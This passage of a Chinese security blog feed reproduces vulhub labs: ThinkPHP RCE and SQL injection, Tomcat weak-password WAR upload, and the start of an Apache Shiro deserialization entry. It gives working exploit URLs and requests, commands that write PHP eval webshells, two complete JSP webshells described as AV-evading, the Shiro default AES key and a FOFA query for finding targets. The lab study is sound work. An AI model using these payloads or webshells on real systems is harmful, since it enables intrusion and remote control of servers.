src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202511365.png" alt="image-20240425202511365"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p><p><a href="https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html">https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html</a></p><p><a href="https://blog.csdn.net/huayimy/article/details/130273362">https://blog.csdn.net/huayimy/article/details/130273362</a></p><p><a href="https://www.cnblogs.com/karsa/p/15983486.html">https://www.cnblogs.com/karsa/p/15983486.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【vulhub】Fastjson漏洞复现&quot;&gt;&lt;a href=&quot;#【vulhub】Fastjson漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;【vulhub】Fastjson漏洞复现&quot;&gt;&lt;/a&gt;【vulhub】Fastjson漏洞复现&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub】ThinkPHP漏洞复现</title>
    <link href="https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-04-24T16:11:39.373Z</published>
    <updated>2024-04-25T01:43:54.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【vulhub】ThinkPHP漏洞复现"><a href="#【vulhub】ThinkPHP漏洞复现" class="headerlink" title="【vulhub】ThinkPHP漏洞复现"></a>【vulhub】ThinkPHP漏洞复现</h1><p>​PHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。<br>​ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。</p><h1 id="2-rce"><a href="#2-rce" class="headerlink" title="2-rce"></a>2-rce</h1><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ThinkPHP 2.x版本中，使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p><p>具体原理过程参考文章：<a href="https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89">https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）</a></p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>根据对漏洞原理的理解，构造payload，获取phpinfo信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png" alt="image-20240424170222558"></p><p>构造payload，配合蚁剑等工具进行连接，获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[sqrt7]))&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png" alt="image-20240424170623602"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png" alt="image-20240424170654949"></p><h1 id="5-0-23-rce"><a href="#5-0-23-rce" class="headerlink" title="5.0.23-rce"></a>5.0.23-rce</h1><h2 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p><p>实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行</p><p> 影响版本</p><p>ThinkPHP 5.0.x<del>5.0.23<br>ThinkPHP 5.1.x</del>5.1.31<br>ThinkPHP 5.2.0beta1</p><p>具体原理参考文章：（需要一定的基础）</p><p><a href="https://blog.csdn.net/solitudi/article/details/113796433">https://blog.csdn.net/solitudi/article/details/113796433</a></p><p><a href="https://blog.csdn.net/qq_58873970/article/details/132711738">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p><h2 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>BP抓包修改数据，执行命令，获取信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png" alt="屏幕截图 2024-04-24 191819"></p><p>尝试创建后门，利用蚁剑进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval(\$_POST[sqrt7])?&gt;&quot; &gt;&gt; sqrt.php</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&quot;|base64 -d &gt;&gt; sqrt.php</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png" alt="image-20240424192934769"></p><h1 id="5-rce"><a href="#5-rce" class="headerlink" title="5-rce"></a>5-rce</h1><h2 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><p>影响版本</p><p>ThinkPHP5:<br>5.0.x<del>5.0.23；<br>5.1.0</del>5.1.30；<br>不同版本payload不同， 5.1.13之后还与debug模式有关</p><p>具体原理参考文章：（需要一定的基础）</p><p><a href="https://www.freebuf.com/articles/web/289860.html">https://www.freebuf.com/articles/web/289860.html</a></p><p><a href="https://blog.csdn.net/qq_58873970/article/details/132711738">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p><h2 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>构造payload，执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br><span class="line"></span><br><span class="line">http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png" alt="image-20240424230451281"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png" alt="image-20240424230509901"></p><p>尝试写入后门木马进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;</span><br><span class="line"></span><br><span class="line">payload解释：调用file_put_contents方法将&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;写入shell.php文件</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png" alt="image-20240424231120979"></p><h1 id="in-sqlinjection"><a href="#in-sqlinjection" class="headerlink" title="in-sqlinjection"></a>in-sqlinjection</h1><h2 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</p><p>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。</p><p>重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。</p><p>影响版本<br>ThinkPHP &lt; 5.1.23<br>该漏洞的形成最关键一点是需要开启debug模式</p><p>具体原理参考文章：（需要一定的基础）</p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><p><a href="https://blog.csdn.net/qq_58873970/article/details/132711738">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p><h2 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134/index.php?ids[]=1&amp;ids[]=2</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png" alt="image-20240424234654144"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png" alt="image-20240424235410605"></p><h1 id="lang-rce"><a href="#lang-rce" class="headerlink" title="lang-rce"></a>lang-rce</h1><h2 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。</p><p>虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&#x2F;pear的环境下，可以包含&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php并写入任意文件。</p><p>影响版本：</p><p>6.0.1 &lt; ThinkPHP≤ 6.0.13</p><p>5.0.0 &lt; ThinkPHP≤ 5.0.12</p><p>5.1.0 &lt; ThinkPHP≤ 5.1.8</p><p><strong>利用条件：</strong></p><p>1、需要Thinkphp开启多语言功能</p><p>2、安装pear扩展</p><p>3、知道pearcmd.php路径</p><p>4、register_argc_argv&#x3D;on</p><h2 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>进行漏洞验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();?&gt;+shell.php</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png" alt="image-20240425091852033"></p><p>传入后门木马，进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();eval($_REQUEST[7]);?&gt;+sqrt.php</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png" alt="image-20240425091917700"></p><p><strong>FOFA搜索语法：</strong></p><blockquote><p>header&#x3D;”think_lang”</p></blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/Yeoman92/article/details/53064670">https://blog.csdn.net/Yeoman92/article/details/53064670</a></p><p><a href="https://www.freebuf.com/sectool/223149.html">https://www.freebuf.com/sectool/223149.html</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113796433">https://blog.csdn.net/solitudi/article/details/113796433</a></p><p><a href="https://blog.csdn.net/qq_58873970/article/details/132711738">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p><p><a href="https://www.freebuf.com/articles/web/289860.html">https://www.freebuf.com/articles/web/289860.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><p><a href="https://blog.csdn.net/qq_51922767/article/details/126859373">https://blog.csdn.net/qq_51922767/article/details/126859373</a></p><p><a href="https://blog.csdn.net/weixin_42253265/article/details/111593955">https://blog.csdn.net/weixin_42253265/article/details/111593955</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【vulhub】ThinkPHP漏洞复现&quot;&gt;&lt;a href=&quot;#【vulhub】ThinkPHP漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;【vulhub】ThinkPHP漏洞复现&quot;&gt;&lt;/a&gt;【vulhub】ThinkPHP漏洞复现&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub】Tomcat漏洞复现</title>
    <link href="https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-04-24T02:46:27.742Z</published>
    <updated>2024-04-24T02:52:23.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【vulhub】Tomcat漏洞复现"><a href="#【vulhub】Tomcat漏洞复现" class="headerlink" title="【vulhub】Tomcat漏洞复现"></a>【vulhub】Tomcat漏洞复现</h1><p>​Tomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。</p><p>​Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。</p><h1 id="Tomcat8"><a href="#Tomcat8" class="headerlink" title="Tomcat8"></a>Tomcat8</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</p><p>Tomcat版本：8.0</p><p>环境说明</p><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><p>​war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接</p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p><p>需要准备好恶意代码，要免杀处理后的木马</p><p>如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）</p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。</p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><p>这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。</p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。</p><p><img src="/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【vulhub】Tomcat漏洞复现&quot;&gt;&lt;a href=&quot;#【vulhub】Tomcat漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;【vulhub】Tomcat漏洞复现&quot;&gt;&lt;/a&gt;【vulhub】Tomcat漏洞复现&lt;/h1&gt;&lt;p&gt;​	Tomc</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</title>
    <link href="https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/"/>
    <id>https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</id>
    <published>2024-04-18T15:31:13.077Z</published>
    <updated>2024-04-20T12:29:03.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>​Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>​Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题</p><p><strong>在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，可以直接反序列化执行恶意代码。</strong>而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p><p><code>具体流程</code></p><p>Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。</p><p>如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。</p><p>加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（密钥key）&#x3D;&gt;反序列化。</p><p>攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png" alt="屏幕截图 2024-04-18 003118"></p><p><code>影响版本</code></p><p>Apache Shiro &lt;&#x3D;1.2.4</p><p><code>shiro特征</code></p><p>首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。</p><p>判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 